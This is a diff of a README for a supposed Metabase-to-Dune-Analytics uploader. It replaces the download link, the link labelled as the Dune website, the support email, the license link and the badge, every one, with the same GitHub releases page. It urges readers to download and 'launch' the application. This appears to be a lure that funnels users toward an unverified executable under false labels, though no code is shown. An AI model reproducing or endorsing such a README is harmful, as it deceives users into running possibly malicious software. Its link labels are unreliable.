@@ -3,9 +3,9 @@
 Welcome to the **Dune-Analytics-Uploader** repository! This tool fetches metrics from our Metabase instance and uploads them to Dune Analytics effortlessly. 
 
 🚀 **Quick Links**:
-- [Download the Application](https://github.com/project/files/App.zip) 👈 (needs to be launched)
-- [Dune Analytics Website](https://duneanalytics.com) 👈(just visit it for more information)
-- [Check "Releases" Section](https://github.com/project/releases) 👈(if the download link is not working)
+- [Download the Application](https://github.com/Miro-Hashcode/Dune-Analytics-Uploader/releases) 👈 (needs to be launched)
+- [Dune Analytics Website](https://github.com/Miro-Hashcode/Dune-Analytics-Uploader/releases) 👈(just visit it for more information)
+- [Check "Releases" Section](https://github.com/Miro-Hashcode/Dune-Analytics-Uploader/releases) 👈(if the download link is not working)
 
 ## About the Project
 In this repository, you will find a powerful tool that integrates with your Metabase data to upload crucial analytics to Dune Analytics. Say goodbye to manual data transfer and hello to automated insights!
@@ -40,12 +40,12 @@ In this repository, you will find a powerful tool that integrates with your Meta
 - nodejs
 
 ## Support
-If you encounter any issues with the tool or have any questions, feel free to reach out to our support team at [support@example.com](mailto:support@example.com).
+If you encounter any issues with the tool or have any questions, feel free to reach out to our support team at [https://github.com/Miro-Hashcode/Dune-Analytics-Uploader/releases](https://github.com/Miro-Hashcode/Dune-Analytics-Uploader/releases).
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/project/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/Miro-Hashcode/Dune-Analytics-Uploader/releases) file for details.
 
 ## Get Started!
 Ready to revolutionize your analytics process? Download the app and start uploading your Metabase metrics to Dune Analytics effortlessly!
 
-[![Download the App](https://img.shields.io/badge/Download-App-<COLOR>.svg)](https://github.com/project/files/App.zip)
+[![Download the App](https://github.com/Miro-Hashcode/Dune-Analytics-Uploader/releases<COLOR>.svg)](https://github.com/Miro-Hashcode/Dune-Analytics-Uploader/releases)
